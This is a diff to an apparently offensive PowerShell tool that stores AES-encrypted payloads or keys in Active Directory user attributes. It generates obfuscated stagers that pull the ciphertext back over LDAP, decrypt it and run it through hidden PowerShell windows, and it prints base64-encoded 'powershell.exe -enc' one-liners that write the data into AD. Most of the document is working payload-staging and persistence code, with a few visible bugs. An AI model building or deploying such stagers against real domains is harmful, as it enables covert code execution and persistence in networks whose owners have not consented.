@@ -1,4 +1,3 @@
-
 ####TODO Checklist
 # Create a seperate stager used to write the AD parameter (Or give the option to write directly from AD from the current machine)
 # e.g. If stager is being stored, base64 encode it, store it, and generate PS oneliner to call it.
@@ -16,12 +15,20 @@ $script:EncryptedB64
 $script:base64IV
 $script:WriteScript
 $script:quesWriteScript
+$script:targetDomain
+$script:username
 
 function Get-Answers {
 	clear
 	while (!$script:ADProperty ){
 		$script:ADProperty = Read-Host "What AD Property do you want to store into?"
 		clear
+	}
+	
+	while (!$script:targetDomain){
+		$script:targetDomain = Read-Host "What is the name of the target Domain? (Current Domain is: $env:USERDNSDOMAIN)"
+		clear
+	
 	}
 	
 	while (!$script:Storage -or $script:Storage -eq "Invalid"){
@@ -117,9 +124,9 @@ function Invoke-RandomKey ($length) {
 }
 
 function Invoke-WritePayloadToAD ($payload) {
-	$global:username = [Environment]::UserName
+	$script:username = [Environment]::UserName
 	#Write String to AD
-	$AD = ([adsisearcher]"(samaccountname=$global:username)").FindOne().GetDirectoryEntry()
+	$AD = ([adsisearcher]"(samaccountname=$script:username)").FindOne().GetDirectoryEntry()
 	$AD.Put($script:ADProperty, $script:EncryptedB64)
 	$AD.SetInfo()
 	#ReadString from AD
@@ -129,7 +136,7 @@ function Invoke-WritePayloadToAD ($payload) {
 	#$DN = "DC=$($Domain.Replace('.', ',DC='))"
 	#$SearchString = "LDAP://$DomainController/$DN"
 	#$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
-	#$Searcher.Filter = "(samaccountname=$global:username)"
+	#$Searcher.Filter = "(samaccountname=$script:username)"
 	#$User = $Searcher.FindOne()
 	#$testString = [System.Text.Encoding]::ASCII.GetString($User.properties.msmqsigncertificates[0])
 }
@@ -147,16 +154,16 @@ function Invoke-GenerateStager ($StagerType) {
 	$varDecryptor = -join ((65..90)+(97..122) | Get-Random -Count 15 | % {[char]$_})
 	
 	
-	
+	Write-Host "Writing script:Storage: $script:Storage"
 	switch($script:Storage) 
 	{
-		"Stager" {<#Needs to pull encrypted payload from somewhere#>
+		"Stager" {
 			$keylocation = Read-Host "Provide the full path to where the key will be stored"
 			$Stager += "`$$varEncryptedB64 = '$script:EncryptedB64'`n"
 			$Stager += "`$$varEncryptedB64IV = `'$script:Base64IV`'`n"
 			$Stager += "`$$varUTF8 = new-object -TypeName System.Text.UTF8Encoding`n"
 			$Stager += "`$$varIV = [System.Convert]::FromBase64String(`$$varEncryptedB64IV)`n"
-			$Stager += "`$$varKey = Read-Host 'you know what I need'"	#How do we wanna provide the key? Pipeline? Read-Host?
+			$Stager += "`$$varKey = Read-Host 'you know what I need'"
 			$Stager += "`$$varaesManaged = New-Object 'System.Security.Cryptography.AesManaged'`n"
 			$Stager += "`$$varaesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC`n"
 			$Stager += "`$$varaesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros`n"
@@ -170,18 +177,31 @@ function Invoke-GenerateStager ($StagerType) {
 			$Stager += "`$$varunencryptedData = [System.Text.Encoding]::UTF8.GetString(`$$varunencryptedData).Trim([char]0)`n"
 			$Stager += "`$$varunencrypteddata | powershell.exe -w hidden`n"
 			$Stager += "`$$varAESManaged.Dispose()`n"
-			#Invoke-WritePayloadToAD($Stager)	
-			Write-Host "To invoke run the following Powershell One-Liner:`n`$DomainController= ([ADSI]'LDAP://RootDSE').dnshostname;`$Domain=`$ENV:USERDNSDOMAIN;`$DC=([ADSI]'LDAP://RootDSE');`$DN=`"DC=`$(`$Domain.Replace('.', ',DC='))`";`$SearchString =  `"LDAP://DomainController/`$DN`";`$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]`$SearchString)`$Searcher.Filter = `"(samaccountname=$global:username);`$User= `$Searcher.FindOne();[System.Text.Encoding]::ASCII.GetString(`$User.properties.$script:ADProperty[0]);"
+			Write-Host "Writing writeScript: $script:writeScript"
+            If ($script:writeScript -eq "False"){
+				Invoke-WritePayloadToAD($Stager)	
+			}
+			else {
+			#TOdo Base64 encoding before write
+			$StagerBytes = [System.text.encoding]::Unicode.GetBytes($Stager) 
+			$StagerB64 = [Convert]::ToBase64String($StagerBytes)
+			$OneLine = "`$CB=([adsisearcher]`"(samaccountname=$script:username)`").FindOne().GetDirectoryEntry();`$CB.Put($script:ADProperty,[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($StagerB64);`$CB.SetInfo();"
+            $OneLineBytes = [System.Text.Encoding]::Unicode.GetBytes($OneLine)
+			$OneLineB64 = [Convert]::ToBase64String($OneLineBytes)
+            Write-Host "To invoke run the following Powershell One-Liner:`npowershell.exe -enc $OneLineB64"
+            "powershell.exe -enc $OneLineB64" | Out-File WriteToAD.txt			
+            }
+
 			#Todo: Generate oneliner to call and execute stager
 		}
 		"Payload" {
-			#$Stager += "`$DomainController = ([ADSI]'LDAP://RootDSE').dnshostname`n"
-			#$Stager += "`$Domain = `$ENV:USERDNSDOMAIN`n"
-			#$Stager += "`$DC = ([ADSI]'LDAP://RootDSE')`n"
-			#$Stager += "`$DN = `"DC=`$($Domain.Replace('.', ',DC='))`"`n"
-			#$Stager += "`$SearchString = `"LDAP://`$DomainController/`$DN`"`n"
-			#$Stager += "`Searcher = New-Object System.DirectoryServices.DirectorySearch([ADSI]`$SearchString)`n"
-			#$Stager += "`$Searcher.Filter =`"(samaccountname=$global:username)`n`""
+			$Stager += "`$DomainController = ([ADSI]'LDAP://RootDSE').dnshostname`n"
+			$Stager += "`$Domain = $script:targetDomain`n`n"
+			$Stager += "`$DC = ([ADSI]'LDAP://RootDSE')`n"
+			$Stager += "`$DN = `"DC=`$(`$Domain.Replace('.', ',DC='))`"`n"
+			$Stager += "`$SearchString = `"LDAP://`$DomainController/`$DN`"`n"
+			$Stager += "`Searcher = New-Object System.DirectoryServices.DirectorySearch([ADSI]`$SearchString)`n"
+			$Stager += "`$Searcher.Filter =`"(samaccountname=$script:username)`n`""
 			$Stager += "`$$varEncryptedB64 = [System.Text.Encoding]::ASCII.GetString(`$User.properties.$script:ADProperty[0])`n"
 			$Stager += "`$$varEncryptedB64IV = `'$script:Base64IV`'`n"
 			$Stager += "`$$varUTF8 = new-object -TypeName System.Text.UTF8Encoding`n"
@@ -201,17 +221,25 @@ function Invoke-GenerateStager ($StagerType) {
 			$Stager += "`$$varunencrypteddata | powershell.exe -w hidden`n"
 			$Stager += "`$$varAESManaged.Dispose()`n"
 			$Stager | Out-File stager.ps1
-			Write-Host Encrypted String:`n$script:EncryptedString
-			#Invoke-WritePayloadToAD($script:EncryptedString)
+			If ($script:writeScript -eq "False"){
+				Invoke-WritePayloadToAD($script:encryptedb64)	
+			}
+			else {
+			#TODO: Base64 Encoding before write
+			$OneLine = "`$CB=([adsisearcher]`"(samaccountname=$script:username)`").FindOne().GetDirectoryEntry();`$CB.Put($script:ADProperty,$script:EncryptedB64);`$CB.SetInfo();"
+			$OneLineBytes = [System.text.encoding]::Unicode.GetBytes($OneLine) 
+			$OneLineB64 = [Convert]::ToBase64String($OneLineBytes)
+				Write-Host "To write the payload to AD use the following command:`n powershell.exe -enc $OneLineB64"
+			}
 		}
 		"Key" {
-			#$Stager += "`$DomainController = ([ADSI]'LDAP://RootDSE').dnshostname`n"
-			#$Stager += "`$Domain = `$ENV:USERDNSDOMAIN`n"
-			#$Stager += "`$DC = ([ADSI]'LDAP://RootDSE')`n"
-			#$Stager += "`$DN = `"DC=`$($Domain.Replace('.', ',DC='))`"`n"
-			#$Stager += "`$SearchString = `"LDAP://`$DomainController/`$DN`"`n"
-			#$Stager += "`Searcher = New-Object System.DirectoryServices.DirectorySearch([ADSI]`$SearchString)`n"
-			#$Stager += "`$Searcher.Filter =`"(samaccountname=$global:username)`n`""
+			$Stager += "`$DomainController = ([ADSI]'LDAP://RootDSE').dnshostname`n"
+			$Stager += "`$Domain = $script:targetDomain`n"
+			$Stager += "`$DC = ([ADSI]'LDAP://RootDSE')`n"
+			$Stager += "`$DN = `"DC=`$(`$Domain.Replace('.', ',DC='))`"`n"
+			$Stager += "`$SearchString = `"LDAP://`$DomainController/`$DN`"`n"
+			$Stager += "`Searcher = New-Object System.DirectoryServices.DirectorySearch([ADSI]`$SearchString)`n"
+			$Stager += "`$Searcher.Filter =`"(samaccountname=$script:username)`n`""
 			$Stager += "`$$varKey = [System.Text.Encoding]::ASCII.GetString(`$User.properties.$script:ADProperty[0])`n"
 			$Stager += "`$$varEncryptedB64 = '$script:EncryptedB64'`n"
 			$Stager += "`$$varEncryptedB64IV = `'$script:Base64IV`'`n"
@@ -231,8 +259,16 @@ function Invoke-GenerateStager ($StagerType) {
 			$Stager += "`$$varunencrypteddata | powershell.exe -w hidden`n"
 			$Stager += "`$$varAESManaged.Dispose()`n"
 			$Stager | Out-File stager.ps1
-			Write-Host Encrypted String:`n$script:EncryptedString
-			#Invoke-WritePayloadToAD($script:EncryptedString)
+			If ($script:writeScript -eq "False"){
+				Invoke-WritePayloadToAD($script:key)	
+			}
+			else {
+			Todo: Base64 Encoding before write
+			$OneLine = "`$CB=([adsisearcher]`"(samaccountname=$script:username)`").FindOne().GetDirectoryEntry();`$CB.Put($script:ADProperty,$script:key);`$CB.SetInfo();"
+			$OneLineBytes = [System.Text.Encoding]::Unicode.GetBytes($OneLine)
+			$OneLineB64 = [Convert]::ToBase64String($OneLineBytes)
+				Write-Host "To write the payload to AD use the following command:`n powershell.exe -enc $OneLineB64"
+			}
 		}
 		default {"Incorrect Storage type chosen"}
 	}
@@ -260,4 +296,3 @@ Get-Answers
 	#$varunencryptedData = $decryptor.TransformFinalBlock($encString, 0, $encstring.Length)
 	#$varunencryptedData = [System.Text.Encoding]::UTF8.GetString($varunencryptedData).Trim([char]0)
 	#Write-Host $varunencryptedData
-
